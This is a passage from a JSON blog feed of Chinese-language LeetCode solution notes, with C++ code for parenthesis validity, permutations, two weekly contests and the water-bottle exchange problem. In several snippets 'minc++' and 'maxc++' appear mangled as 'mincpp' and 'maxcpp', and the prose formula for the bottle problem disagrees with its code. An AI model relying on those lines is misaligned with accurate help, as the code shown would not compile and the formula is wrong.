            "content_html": "<h1 id=\"括号问题\"><a href=\"#括号问题\" class=\"headerlink\" title=\"括号问题\"></a>括号问题</h1><h2 id=\"是否为有效括号\"><a href=\"#是否为有效括号\" class=\"headerlink\" title=\"是否为有效括号\"></a>是否为有效括号</h2><p>题目链接：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9sZWV0Y29kZS1jbi5jb20vcHJvYmxlbXMvdmFsaWQtcGFyZW50aGVzZXMv\">有效的括号</span></p>\n<p>可采用栈的先入后出特性，一个个匹配</p>\n<h2 id=\"判断一段字符串经过部分修改后是否能够成为有效括号字符串，可以修改的位置由-locked-存储\"><a href=\"#判断一段字符串经过部分修改后是否能够成为有效括号字符串，可以修改的位置由-locked-存储\" class=\"headerlink\" title=\"判断一段字符串经过部分修改后是否能够成为有效括号字符串，可以修改的位置由 locked 存储\"></a>判断一段字符串经过部分修改后是否能够成为有效括号字符串，可以修改的位置由 locked 存储</h2><p>如 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9sZWV0Y29kZS1jbi5jb20vcHJvYmxlbXMvdmFsaWQtcGFyZW50aGVzaXMtc3RyaW5nLw==\">有效的括号字符串</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9sZWV0Y29kZS1jbi5jb20vcHJvYmxlbXMvY2hlY2staWYtYS1wYXJlbnRoZXNlcy1zdHJpbmctY2FuLWJlLXZhbGlkLw==\">判断一个括号字符串是否有效</span></p>\n<p>利用平衡值的方法，一个字符串是否为有效括号，那么在某个位置前的右括号之前必然有左括号相匹配，在某个某个位置的左括号之后必然有右括号相匹配</p>\n<p>以下为几种不同的具体方法</p>\n<h3 id=\"两次遍历，正序遍历和逆序遍历。\"><a href=\"#两次遍历，正序遍历和逆序遍历。\" class=\"headerlink\" title=\"两次遍历，正序遍历和逆序遍历。\"></a>两次遍历，正序遍历和逆序遍历。</h3><p>正序遍历时，用 count 记录此时未匹配左括号数，其中如果<code>locked[i]=′0′</code>，那么以左括号来记，当匹配到不可变的右括号时，<code>count−−</code>，如果<code>count &lt; 0</code>出现了，那么该字符串不是有效的括号字符串</p>\n<p>逆序遍历时，同正序遍历时的方法，用 count 记录此时未匹配右括号数，其中如果<code>locked[i]=′0′</code>，那么以右括号来记，当匹配到不可变的左括号时，<code>count−−</code>，如果<code>count &lt; 0</code>出现了，那么该字符串不是有效的括号字符串</p>\n<p>以下为参考代码</p>\n<pre><code class=\"cpp\">class Solution {\npublic:\n    bool checkValidString(string s) {\n        int count=0;\n        for(int i=0;i&lt;s.size();i++)\n        {\n            if(s[i]=='('||s[i]=='*')\n                count++;\n            else\n                count--;\n            if(count&lt;0)\n                return false;\n        }\n        count=0;\n        for(int i=s.size()-1;i&gt;=0;i--)\n        {\n            if(s[i]==')'||s[i]=='*')\n                count++;\n            else\n                count--;\n            if(count&lt;0)\n                return false;\n        }\n        return true;\n    }\n};\n</code></pre>\n<h3 id=\"贪心算法：一次遍历，用-maxc-记录最大未匹配数，minc-记录最小未匹配数\"><a href=\"#贪心算法：一次遍历，用-maxc-记录最大未匹配数，minc-记录最小未匹配数\" class=\"headerlink\" title=\"贪心算法：一次遍历，用 maxc 记录最大未匹配数，minc 记录最小未匹配数\"></a>贪心算法：一次遍历，用 maxc 记录最大未匹配数，minc 记录最小未匹配数</h3><p>当遇到不可变的右(左)括号时<code>maxc</code>，和<code>minc</code>都加一 (减一), 如果在此期间，<code>maxc &lt; 0</code>，那么证明有右括号不能被匹配那么这串字符串是无效的</p>\n<p>当遇到可变的位置时，由于既可以变也可以不变，那么<code>maxcpp</code>，<code>minc--</code>；其中如果<code>minc</code>减之前如果是0，那么<code>minc</code>就变为1，因为会增加(如果是<code>*</code>可代表左右括号或者空字符，那么只需维护<code>minc&gt;=0</code>即可，因为<code>*</code>有三种状态)</p>\n<p>如果在遍历过程中，<code>minc &gt; maxc</code>，那么证明该串是无效的</p>\n<p>最后如果该串是有效，那么<code>minc</code>必为0，所以返回值为<code>minc == 0</code></p>\n<p>代码示例</p>\n<h4 id=\"第一道\"><a href=\"#第一道\" class=\"headerlink\" title=\"第一道\"></a>第一道</h4><pre><code class=\"cpp\">class Solution {\npublic:\n    bool checkValidString(string s) {\n        int minc=0,maxc=0;\n        for(int i=0;i&lt;s.size();i++)\n        {\n            if(s[i]=='(')\n            {\n                mincpp;\n                maxcpp;\n            }\n            else if(s[i]==')')\n            {\n                minc=minc==0?0:minc-1;\n                maxc--;\n                if(maxc&lt;0)\n                    return false;\n            }\n            else\n            {\n                minc=minc==0?0:minc-1;\n                maxcpp;\n            }\n        }\n        return minc==0;\n    }\n};\n</code></pre>\n<h4 id=\"第二道\"><a href=\"#第二道\" class=\"headerlink\" title=\"第二道\"></a>第二道</h4><pre><code class=\"cpp\">class Solution {\npublic:\n    bool canBeValid(string s, string locked) {\n        if(s.size()%2==1)  return false;\n        int minc=0,maxc=0;\n        for(int i=0;i&lt;s.size();i++)\n        {\n            if(locked[i]=='1')\n            {\n                if(s[i]=='(')\n                {\n                    mincpp;\n                    maxcpp;\n                }\n                if(s[i]==')')\n                {\n                    maxc--;\n                    minc=minc==0?1:minc-1;\n                    if(maxc&lt;0)\n                        return false;\n                }\n            }\n            else\n            {\n                minc=minc==0?1:minc-1;\n                maxcpp;\n            }\n            if(minc&gt;maxc)\n                return false;\n        }\n        return minc==0;\n    }\n};\n</code></pre>\n",
            "tags": [
                "贪心",
                "括号"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/12ad1f11/",
            "url": "http://dpm12345.cn/posts/12ad1f11/",
            "title": "全排列",
            "date_published": "2021-12-24T01:54:40.000Z",
            "content_html": "<h1 id=\"无重复数字的全排列\"><a href=\"#无重复数字的全排列\" class=\"headerlink\" title=\"无重复数字的全排列\"></a>无重复数字的全排列</h1><p>先考虑 2 个数的全排列，很明显就是只有两种，一种两个数字的顺序不改变，另一种改变两个数字的顺序</p>\n<p>然后再考虑 3 个数的全排列，比如<code>1，2，3</code></p>\n<p>那么总共排列的种类总共为</p>\n<p>1，2，3<br>1，3，2<br>2，1，3<br>2，3，1<br>3，1，2<br>3，2，1</p>\n<p>由此不难发现，每一次的排列总个数（不同的数字开头）都可以看作是在前一种的基础上交换两个数的结果</p>\n<p>例如<code>1，3，2</code>是在<code>1，2，3</code>的基础上交换 2，3 位置后得到的。以此类推，4 个数，5 个数，n 个数也一样。那么在这里可以采用递归方法，与汉诺塔问题相似，我们将 n 个数划分为 1 和 n-1 个数，先交换两部分得到一种情况，然后以此为基础再进行交换，结束此种情况后将数字交换回来进入下一种情况</p>\n<p>因此我们可以构造 perm 函数，第一个形参为数组，第二个为未交换数，第三个为数组的末尾下标</p>\n<p>因此核心代码为:</p>\n<pre><code class=\"cpp\">// 假设这里的递归函数为 perm，数组为 nums，交换的对象为 nums [i] 和 nums [k]\n    for(int i=k;i&lt;=m;i++)        // 这里用于把后面的数进行交换\n    {\n        swap(nums[i],nums[k]);            // 交换，创造新的情况\n        perm(nums,k+1,m);                 // 进入新的情况，k+1 为之后未交换的情况\n        swap(nums[i],nums[k]);           // 交换回来\n    }\n</code></pre>\n<p>这里我们需要考虑原来的情况，也就是说此时不需要交换，所以为了保持代码的一致性，可以一开始使其与自身交换，因此为<code>swap(nums[i],nums[k])</code></p>\n<p>代码如下</p>\n<pre><code class=\"cpp\">class Solution {\npublic:\n    void swap(int*p,int*q)\n    {\n        int temp=*p;\n        *p=*q;\n        *q=temp;\n    }\n    void out(vector&lt;int&gt;&amp;nums,vector&lt;vector&lt;int&gt;&gt;&amp;ans,int k,int m)\n    {\n        if(k==m)\n        {\n            ans.push_back(nums);\n        }\n        else\n        {\n            for(int i=k;i&lt;=m;i++)\n            {\n                swap(&amp;nums[i],&amp;nums[k]);\n                out(nums,ans,k+1,m);\n                swap(&amp;nums[i],&amp;nums[k]);\n            }\n        }\n    }\n    vector&lt;vector&lt;int&gt;&gt; permute(vector&lt;int&gt;&amp; nums) {\n        vector&lt;vector&lt;int&gt;&gt;ans;\n        out(nums,ans,0,nums.size()-1);\n        return ans;\n    }\n};\n</code></pre>\n<p>该问题在 leetcode 也有题目</p>\n<p>题目链接：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9sZWV0Y29kZS1jbi5jb20vcHJvYmxlbXMvcGVybXV0YXRpb25zLw==\">全排列</span></p>\n<h1 id=\"有重复数字的全排列\"><a href=\"#有重复数字的全排列\" class=\"headerlink\" title=\"有重复数字的全排列\"></a>有重复数字的全排列</h1>",
            "tags": [
                "递归"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/415dc2d2/",
            "url": "http://dpm12345.cn/posts/415dc2d2/",
            "title": "leetcode 第 272 场周赛",
            "date_published": "2021-12-19T15:20:34.000Z",
            "content_html": "<p>【战绩】</p>\n<p><img data-src=\"/../../../post_images/leetcode%E7%AC%AC272%E5%9C%BA%E5%91%A8%E8%B5%9B_%E6%88%98%E7%BB%A9.png\"></p>\n<p>总结:</p>\n<p>第一场按时参与的leetcode 周赛，总的来说，这次的题目并不是很难，思路会有，而自己却写不出来，最主要还是细节方面和一些算法的不熟悉，不能够做到完全吸收，就拿第四题说，我能想到解题方向为先将下</p>\n<p>标间隔为k的元素构成一个个数组，然后求这些数组各自内部的最长非严格上升子序列的长度，最后用数组原长度减去这一最长非严格上升子序列的长度即为这一数组的最少修改值，答案即为所有数组的最少修改值。</p>\n<p>但最后我并没有写出来，更加不好的是，我明白怎么去求最长非严格上升序列的动态规划求法，但脑中并未有其时间复杂度更小的贪心+二分查找解法，为此我还去搜求最长严格递增的贪心+二分查找解法，但自己并</p>\n<p>未理解该算法的核心，也并不知道怎么修改才能作为求最长非严格上升子序列的代码</p>\n<p>总结到此，下面进行题目解析</p>\n<h1 id=\"找出数组中的第一个回文字符串\"><a href=\"#找出数组中的第一个回文字符串\" class=\"headerlink\" title=\"找出数组中的第一个回文字符串\"></a>找出数组中的第一个回文字符串</h1><p>题目链接：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9sZWV0Y29kZS1jbi5jb20vcHJvYmxlbXMvZmluZC1maXJzdC1wYWxpbmRyb21pYy1zdHJpbmctaW4tdGhlLWFycmF5Lw==\">找出数组中的第一个回文字符串</span></p>\n<p>题目详情:</p>\n<p><img data-src=\"/../../../post_images/%E6%89%BE%E5%87%BA%E6%95%B0%E7%BB%84%E4%B8%AD%E7%9A%84%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%9B%9E%E6%96%87%E5%AD%97%E7%AC%A6%E4%B8%B2_%E9%A2%98%E7%9B%AE%E8%AF%A6%E6%83%85.png\" alt=\"找出数组中的第一个回文字符串_题目详情\"></p>\n<p>思路：</p>\n<p>这题比较简单，只需写一个函数用于判断是否为回文串，若是则直接输出，结束程序</p>\n<p>以下为代码：</p>\n<pre><code class=\"cpp\">class Solution {\npublic:\n    bool if_hw(string &amp;s)\n    {\n        for(int i=0;i&lt;s.length()/2;i++)\n        {\n            if(s[i]!=s[s.length()-i-1])\n                return false;\n        }\n        return true;\n    }\n    string firstPalindrome(vector&lt;string&gt;&amp; words) {\n        for(int i=0;i&lt;words.size();i++)\n        {\n            if(if_hw(words[i]))\n                return words[i];\n        }\n        return \"\";\n    }\n};\n</code></pre>\n<p>或者使用迭代器</p>\n<pre><code class=\"cpp\">class Solution {\npublic:\n    string firstPalindrome(vector&lt;string&gt;&amp; a) {\n        for(string s : a) {\n            if(s == string(s.rbegin(), s.rend())) return s;\n        }\n        return \"\";\n    }\n};\n</code></pre>\n<h1 id=\"向字符串添加空格\"><a href=\"#向字符串添加空格\" class=\"headerlink\" title=\"向字符串添加空格\"></a>向字符串添加空格</h1><p>题目链接：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9sZWV0Y29kZS1jbi5jb20vcHJvYmxlbXMvYWRkaW5nLXNwYWNlcy10by1hLXN0cmluZy8=\">向字符串添加空格</span></p>\n<p>题目详情：</p>\n<p><img data-src=\"/../../../post_images/%E5%90%91%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%B7%BB%E5%8A%A0%E7%A9%BA%E6%A0%BC_%E9%A2%98%E7%9B%AE%E8%AF%A6%E6%83%85.png\" alt=\"向字符串添加空格_题目详情\"></p>\n<p>思路:</p>\n<p>这题也比较简单，只需遍历时，在对应位置添上空格即可，可使用if解决</p>\n<p>以下为代码：</p>\n<pre><code class=\"cpp\">class Solution {\npublic:\n    string addSpaces(string s, vector&lt;int&gt;&amp; spaces) {\n        int index=0;\n        string ans;\n        for(int i=0;i&lt;s.length();i++)\n        {\n            if(index&lt;spaces.size()&amp;&amp;i==spaces[index])\n            {\n                ans.push_back(' ');\n                index++;\n            }\n            ans.push_back(s[i]);\n        }\n        return ans;\n    }\n};\n</code></pre>\n<h1 id=\"股票平滑下跌阶段的数目\"><a href=\"#股票平滑下跌阶段的数目\" class=\"headerlink\" title=\"股票平滑下跌阶段的数目\"></a>股票平滑下跌阶段的数目</h1><p>题目链接：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9sZWV0Y29kZS1jbi5jb20vcHJvYmxlbXMvbnVtYmVyLW9mLXNtb290aC1kZXNjZW50LXBlcmlvZHMtb2YtYS1zdG9jay8=\">股票平滑下跌阶段的数目</span></p>\n<p>题目详情：</p>\n<p><img data-src=\"/../../../post_images/%E8%82%A1%E7%A5%A8%E5%B9%B3%E6%BB%91%E4%B8%8B%E8%B7%8C%E9%98%B6%E6%AE%B5%E7%9A%84%E6%95%B0%E7%9B%AE_%E9%A2%98%E7%9B%AE%E8%AF%A6%E6%83%85.png\" alt=\"股票平滑下跌阶段的数目_题目详情\"></p>\n<p>思路: </p>\n<p>观察可知，平滑下跌阶段即为公差为<code>-1</code>的等差数列，而要具体求出结果就可以为先求数组中的各个最长等差数列的长度，然后存入，最后只需加上各个等差数列长度的$n+(n-1)+n-1+・・・+1$</p>\n<p>得到答案</p>\n<pre><code class=\"cpp\">class Solution {\npublic:\n    long long cal(long long n)\n    {\n        long long ans=0;\n        while(n!=0)\n        {\n            ans+=n--;\n        }\n        return ans;\n    }\n    long long getDescentPeriods(vector&lt;int&gt;&amp; prices) {\n        vector&lt;long long&gt;record;\n        long long sum=0;\n        for(int i=0;i&lt;prices.size();i++)\n        {\n            if(sum==0)\n                sum++;\n            else\n            {\n                if(prices[i]==prices[i-1]-1)\n                {\n                    sum++;\n                }\n                else\n                {\n                    record.push_back(sum);\n                    sum=1;\n                }\n            }\n        }\n        if(sum!=0)\n            record.push_back(sum);\n        long long ans=0;\n        for(int i=0;i&lt;record.size();i++)\n        {\n            ans+=cal(record[i]);\n        }\n        return ans;\n    }\n};\n</code></pre>\n<p>大佬的代码</p>\n<pre><code class=\"cpp\">class Solution {\npublic:\n    long long getDescentPeriods(vector&lt;int&gt;&amp; a) {\n        long long ans = 0;\n        for(int i = 0; i &lt; a.size(); ) {\n            int j = i;\n            while(j &lt; a.size() &amp;&amp; a[j] - a[i] == i - j) ++j;\n            ans += (long long)(j - i) * (j - i + 1) / 2;\n            i = j;\n        }\n        return ans;\n    }\n};\n</code></pre>\n<p>思路相同，但用来了更为简便的写法<br>相对于我的代码，我的显得过于繁琐，其实无需将个数存入新的数组，而是可以边得到边计算，而计算时用$(j−i)∗(j−i+1)/2$<del>我怎么就忘了呢</del></p>\n<h1 id=\"使数组-K-递增的最少操作次数\"><a href=\"#使数组-K-递增的最少操作次数\" class=\"headerlink\" title=\"使数组 K 递增的最少操作次数\"></a>使数组 K 递增的最少操作次数</h1><p>题目链接：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9sZWV0Y29kZS1jbi5jb20vcHJvYmxlbXMvbWluaW11bS1vcGVyYXRpb25zLXRvLW1ha2UtdGhlLWFycmF5LWstaW5jcmVhc2luZy8=\">使数组 K 递增的最少操作次数</span></p>\n<p>题目详情：</p>\n<p><img data-src=\"/../../../post_images/%E4%BD%BF%E6%95%B0%E7%BB%84K%E9%80%92%E5%A2%9E%E7%9A%84%E6%9C%80%E5%B0%91%E6%93%8D%E4%BD%9C%E6%AC%A1%E6%95%B0_%E9%A2%98%E7%9B%AE%E8%AF%A6%E6%83%85.png\" alt=\"使数组K递增的最少操作次数_题目详情\"></p>\n<p>思路: 在总结中我差不多讲过，这里简略讲一下</p>\n<p>题目要求求使数组K递增的最少操作次数，我们将相差k下标的元素排列在一起，若想要让其非严格递增，求最少修改数，不难得到此结论，若想在花最少次数得到非严格递增数列，那么该次数一定为该数列里的最长非严格递增子序列的长度与该序列长度的差值</p>\n<p>而求最长非严格递增子序列的长度的方法有两种，一种动态规划，另一种是贪心+二分。 </p>\n<p>在这道题里，因为动态规划时间复杂度较高，很容易超出时间限制，故这题采用贪心+二分</p>\n<p>【相关题目】:<span class=\"exturl\" data-url=\"aHR0cHM6Ly9sZWV0Y29kZS1jbi5jb20vcHJvYmxlbXMvbG9uZ2VzdC1pbmNyZWFzaW5nLXN1YnNlcXVlbmNlLw==\">【最长递增子序列】</span></p>\n<p>所以说接下来所要做的事为： </p>\n<ol>\n<li>将下标相差 k 的元素放在一起，构成新的数组 </li>\n<li>求出该数组的最长非严格递增子序列的长度与数组长度的差值</li>\n<li>将各差值相加</li>\n</ol>\n<p>该方法具体原理</p>\n<p>考虑一个简单的贪心，如果我们要使上升子序列尽可能的长，则我们需要让序列上升得尽可能慢，因此我们希望每次在上升子序列最后加上的那个数尽可能的小。</p>\n<p>基于上面的贪心思路，我们维护一个数组<code>d[i]</code>，表示长度为<code>i</code>的最长上升子序列的末尾元素的最小值， 用<code>len</code>记录目前最长上升子序列的长度，起始时<code>len</code>为<code>1</code>，<code>d[1]=nums[0]</code>。</p>\n<p>同时我们可以注意到<code>d[i]</code>是关于<code>i</code>单调递增的。因为如果<code>d[j]≥d[i]</code>且<code>j &lt; i</code>，我们考虑从长度为<code>i</code>的最长上升子序列的末尾删除<code>i-j</code>个元素，那么这个序列长度变为<code>j</code>，且第<code>j</code>个元素<code>x</code>（末尾元素）必然小于<code>d[i]</code>，也就小于<code>d[j]</code>。那么我们就找到了一个长度为<code>j</code>的最长上升子序列，并且末尾元素比<code>d[j]</code>小， 从而产生了矛盾。因此数组<code>d</code>的单调性得证。</p>\n<p>我们依次遍历数组<code>nums</code>中的每个元素，并更新数组<code>d</code>和<code>len</code>的值。如果<code>nums [i]&gt;d [len]</code>则更新<code>len = len + 1</code>，否则在<code>d[1…len]</code>中找满足<code>d[i−1] &lt; nums[j] &lt; d[i]</code>的下标<code>i</code>，并更新<code>d[i] = nums[j]</code></p>\n<p>根据d数组的单调性，我们可以使用二分查找寻找下标<code>i</code>，优化时间复杂度。</p>\n<p>最后整个算法流程为：</p>\n<p>设当前已求出的最长上升子序列的长度为<code>len</code>初始时为1），从前往后遍历数组<code>nums</code>，在遍历到<code>nums[i]</code>时：</p>\n<p>如果<code>nums [i]&gt;d [len]</code>，则直接加入到d数组末尾，并更新<code>len = len + 1</code></p>\n<p>否则，在d数组中二分查找，找到第一个比<code>nums[i]</code>小的数<code>d[k]</code>，并更新<code>d[k+1]=nums[i]</code>。 </p>\n<p>以输入序列<code>[0, 8, 4, 12, 2]</code>为例： </p>\n<p>第一步插入0，d = [0];</p>\n<p>第二步插入8，d = [0, 8]; </p>\n<p>第三步插入4，d = [0, 4];</p>\n<p> 第四步插入12，d = [0, 4, 12]; </p>\n<p>第五步插入2，d = [0, 2, 12]; </p>\n<p>最终得到最大递增子序列长度为3。 </p>\n<p>– 摘自 leetcode 官方题解 (最长递增子序列) </p>\n<p>与本题区别： 上面的解析是针对严格递增的，不能有重复元素，而在本题中，是有重复元素，即不严格递增，所以在找寻 插入位置时会有所不同，当发现有数大于等于末位数时，直接接在后面，若小于，那么找出大于这个数的第一个数 </p>\n<p>以下为代码：</p>\n<pre><code class=\"cpp\">class Solution {\npublic:\n    int search(vector&lt;int&gt;&amp;nums)\n    {\n        int n=nums.size();\n        int index=1;\n        vector&lt;int&gt;dp(n+1);\n        dp[index]=nums[0];\n        for(int i=1;i&lt;n;i++)\n        {\n            if(nums[i]&gt;=dp[index])\n            {\n                dp[++index]=nums[i];\n            }\n            else\n            {\n                int left=1,right=index;\n                while(left&lt;=right)\n                {\n                    int mid=(left+right)/2;\n                    if(nums[i]&gt;=dp[mid])\n                    {\n                        left=mid+1;\n                    }\n                    else\n                    {\n                        right=mid-1;\n                    } \n                }\n                dp[left]=nums[i];\n            }\n        }\n        return index;\n    }\n    int kIncreasing(vector&lt;int&gt;&amp; arr, int k) {\n        vector&lt;int&gt;sum(arr.size());\n        for(int i=0;i&lt;k;i++)\n            sum[i]=i;\n        for(int i=k;i&lt;arr.size();i++)\n        {\n            sum[i]=sum[i-k];\n        }\n        vector&lt;vector&lt;int&gt;&gt;record(k,vector&lt;int&gt;(0));\n        for(int i=0;i&lt;arr.size();i++)\n        {\n            record[sum[i]].push_back(arr[i]);\n        }\n        int ans=0;\n        for(int i=0;i&lt;record.size();i++)\n        {\n            ans+=record[i].size()-search(record[i]);\n        }\n        return ans;\n    }\n};\n</code></pre>\n",
            "tags": []
        },
        {
            "id": "http://dpm12345.cn/posts/3b3e846/",
            "url": "http://dpm12345.cn/posts/3b3e846/",
            "title": "换酒问题",
            "date_published": "2021-12-17T06:54:40.000Z",
            "content_html": "<p>题目链接:<span class=\"exturl\" data-url=\"aHR0cHM6Ly9sZWV0Y29kZS1jbi5jb20vcHJvYmxlbXMvd2F0ZXItYm90dGxlcy8=\">换酒问题</span></p>\n<p>题目详情:</p>\n<p><img data-src=\"/../../../post_images/%E6%8D%A2%E9%85%92%E9%97%AE%E9%A2%98_%E9%A2%98%E7%9B%AE%E8%AF%A6%E6%83%85.png\"></p>\n<h1 id=\"模拟\"><a href=\"#模拟\" class=\"headerlink\" title=\"模拟\"></a>模拟</h1><pre><code class=\"cpp\">class Solution {\npublic:\n    int numWaterBottles(int numBottles, int numExchange) {\n        int ans=0,have=numBottles,empty=0;\n        while(have!=0)\n        {\n            ans+=have;\n            empty+=have;\n            have=empty/numExchange;\n            empty=empty%numExchange;\n        }\n        return ans;\n    }\n};\n</code></pre>\n<h1 id=\"数学\"><a href=\"#数学\" class=\"headerlink\" title=\"数学\"></a>数学</h1><p>假设开始有$n$个酒瓶，$m$个空酒瓶换一瓶酒，那么每次消耗的酒瓶数为$m-1$，所以答案即为<br>$$<br>\\lfloor \\frac{n}{m-1} \\rfloor<br>$$</p>\n<pre><code class=\"cpp\">class Solution {\npublic:\n    int numWaterBottles(int numBottles, int numExchange) {\n        return numBottles &gt;= numExchange ? (numBottles - numExchange) / (numExchange - 1) + 1 + numBottles : numBottles;\n    }\n};\n</code></pre>\n",
            "tags": []
        },
        {
            "id": "http://dpm12345.cn/posts/d8bfa4d3/",
            "url": "http://dpm12345.cn/posts/d8bfa4d3/",
            "title": "leetcode 第 271 场周赛",
            "date_published": "2021-12-12T15:20:34.000Z",
            "content_html": "<p>写在前面：这次是自己报名的第一场周赛，但最后忘记了有这一回事了，所以要记得给自己设个闹钟，提醒自己 </p>\n<p>弥补：虽然错过了，但题目不能不做</p>\n<p>以下是之后做的</p>\n<h1 id=\"环和杆\"><a href=\"#环和杆\" class=\"headerlink\" title=\"环和杆\"></a>环和杆</h1><p>题目链接：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9sZWV0Y29kZS1jbi5jb20vcHJvYmxlbXMvcmluZ3MtYW5kLXJvZHMv\">环和杆</span></p>\n<p>题目详情:</p>\n<p><img data-src=\"/../../../post_images/%E7%90%83%E5%92%8C%E6%9D%86_%E9%A2%98%E7%9B%AE%E8%AF%A6%E6%83%851.png\"></p>\n<p><img data-src=\"/../../../post_images/%E7%90%83%E5%92%8C%E6%9D%86_%E9%A2%98%E7%9B%AE%E8%AF%A6%E6%83%852.png\"></p>\n<p><img data-src=\"/../../../post_images/%E7%90%83%E5%92%8C%E6%9D%86_%E9%A2%98%E7%9B%AE%E8%AF%A6%E6%83%853.png\"></p>\n<p><img data-src=\"/../../../post_images/%E7%90%83%E5%92%8C%E6%9D%86_%E9%A2%98%E7%9B%AE%E8%AF%A6%E6%83%854.png\"></p>\n<p>该题是明显的计数题，记录每一条杆上不同颜色的环的数量，当三种颜色数量都不为零时，总个数加一</p>\n<h2 id=\"解法一\"><a href=\"#解法一\" class=\"headerlink\" title=\"解法一\"></a>解法一</h2><p>利用数组</p>\n<pre><code class=\"cpp\">class Solution {\npublic:\n    int countPoints(string rings) {\n        vector&lt;vector&lt;int&gt;&gt;a(10,vector&lt;int&gt;(3));     // 总共最多有 10 个杆，a [i][0],a [i][1],a [i][2]\n                                                     // 分别记录 R、G、B 的个数\n        for(int i=0;i&lt;rings.length();i+=2)\n        {\n            if(rings[i]=='R')\n            {\n                a[rings[i+1]-48][0]++;\n            }\n            else if(rings[i]=='G')\n            {\n                a[rings[i+1]-48][1]++;\n            }\n            else if(rings[i]=='B')\n            {\n                a[rings[i+1]-48][2]++;\n            }\n        }\n        int ans=0;\n        for(int i=0;i&lt;=9;i++)\n        {\n            if(a[i][0]&amp;&amp;a[i][1]&amp;&amp;a[i][2])     // 当三种杆数量都不为 0 时，ans 加一\n            ans++;\n        }\n        return ans;\n    }\n};\n</code></pre>\n<h2 id=\"解法二\"><a href=\"#解法二\" class=\"headerlink\" title=\"解法二\"></a>解法二</h2><p>下面为周赛用时最少的Aoxiang Cui的代码</p>\n<pre><code class=\"cpp\">class Solution {\npublic:\n    int countPoints(string s) {\n        map&lt;char, int&gt; A;\n        A['R'] = 0;\n        A['G'] = 1;\n        A['B'] = 2;\n        vector&lt;int&gt; cnt(10);\n        for (int i = 0; i &lt; (int)s.size(); i += 2) {\n            int x = A[s[i]];\n            int y = s[i + 1] - '0';\n            cnt[y] |= 1 &lt;&lt; x;\n        }\n        int ret = 0;\n        for (int k = 0; k &lt; 10; ++k) {\n            if (cnt[k] == 7) ++ret;\n        }\n        return ret;\n        \n    }\n};\n</code></pre>\n<p>借鉴经验：</p>\n<p>在该题中我的方法中的若找到某个字母，则在对应的数组位置加一，最后需判断三个代表 环的元素是否大于零，需要用<code>if</code>来判断，缺点是单判断的个数变多是，代码则会显得冗长 而在其所用的是二进制的计数法，</p>\n<p>因为二进制的特点为<code>0，1</code>组合，那么这样可以把不同的位看作是一个一个的容器，当存储某个东西时，可将该容器值变为<code>1</code></p>\n<p>该方法中的核心代码便是：</p>\n<pre><code class=\"cpp\">int x = A[s[i]];\nint y = s[i + 1] - '0';\ncnt[y] |= 1 &lt;&lt; x;\n</code></pre>\n<p>这几行代码表示的意思分别为</p>\n<p>第一行：对读到的环进行判断，依据之前的map，找到对应容器</p>\n<p>第二行：对读到的杆编号转化为int类型</p>\n<p>第三行：将该环存入，1&lt;&lt;x 表示的为环所在位置</p>\n<p>那么当所有环都存完后，那么如果三个环都存入，那么<code>cnt[i]</code>的值必然是<code>7</code>，</p>\n<p>因为在该方法中，由map，R、G、B 对应的位置分别为$2^0,2^1,2^2$, 如果都存入，三个</p>\n<p>位置显示都为$1$，那么$cnt[i]=2^0+2^1+2^2=7$</p>\n<p>所以结尾处代码为</p>\n<pre><code class=\"cpp\">for (int k = 0; k &lt; 10; ++k) \n{\n     if (cnt[k] == 7) ++ret;\n}\n</code></pre>\n<h1 id=\"子数组范围和\"><a href=\"#子数组范围和\" class=\"headerlink\" title=\"子数组范围和\"></a>子数组范围和</h1><p>题目链接：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9sZWV0Y29kZS1jbi5jb20vcHJvYmxlbXMvc3VtLW9mLXN1YmFycmF5LXJhbmdlcy8=\">子数组范围和</span></p>\n<p>题目详情:</p>\n<p><img data-src=\"/../../../post_images/%E5%AD%90%E6%95%B0%E7%BB%84%E8%8C%83%E5%9B%B4%E5%92%8C_%E9%A2%98%E7%9B%AE%E8%AF%A6%E6%83%851.png\"></p>\n<p><img data-src=\"/../../../post_images/%E5%AD%90%E6%95%B0%E7%BB%84%E8%8C%83%E5%9B%B4%E5%92%8C_%E9%A2%98%E7%9B%AE%E8%AF%A6%E6%83%852.png\"></p>\n<p>方法: 滑动窗口 (暴力)</p>\n<p><code>i</code>遍历每一个数组开头，开始增加窗口长度之前，先更新<code>MAX</code>和<code>MIN</code>的值，之后<code>j</code>从<code>i+1</code>开始不断增加 增加的过程中不断更新<code>MAX</code>，<code>MIN</code>的值，更新完后加上最大值减去最小值的值，如此，循环结束后 自然能够得到答案</p>\n<pre><code class=\"cpp\">class Solution {\npublic:\n    long long subArrayRanges(vector&lt;int&gt;&amp; nums) {\n        long long MAX,MIN,ans=0;\n        for(int i=0;i&lt;nums.size();i++)\n        {\n            MAX=MIN=nums[i];\n            for(int j=i+1;j&lt;nums.size();j++)\n            {\n                MAX=fmax(MAX,nums[j]);\n                MIN=fmin(MIN,nums[j]);\n                ans+=MAX-MIN;      \n            }\n        }\n        return ans;\n    }\n};\n</code></pre>\n<h1 id=\"给植物浇水-II\"><a href=\"#给植物浇水-II\" class=\"headerlink\" title=\"给植物浇水 II\"></a>给植物浇水 II</h1><p>题目链接：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9sZWV0Y29kZS1jbi5jb20vcHJvYmxlbXMvd2F0ZXJpbmctcGxhbnRzLWlpLw==\">给植物浇水 II</span></p>\n<p>题目详情:</p>\n<p><img data-src=\"/../../../post_images/%E7%BB%99%E6%A4%8D%E7%89%A9%E6%B5%87%E6%B0%B4II_%E9%A2%98%E7%9B%AE%E8%AF%A6%E6%83%851.png\"></p>\n<p><img data-src=\"/../../../post_images/%E7%BB%99%E6%A4%8D%E7%89%A9%E6%B5%87%E6%B0%B4II_%E9%A2%98%E7%9B%AE%E8%AF%A6%E6%83%852.png\"></p>\n<p><img 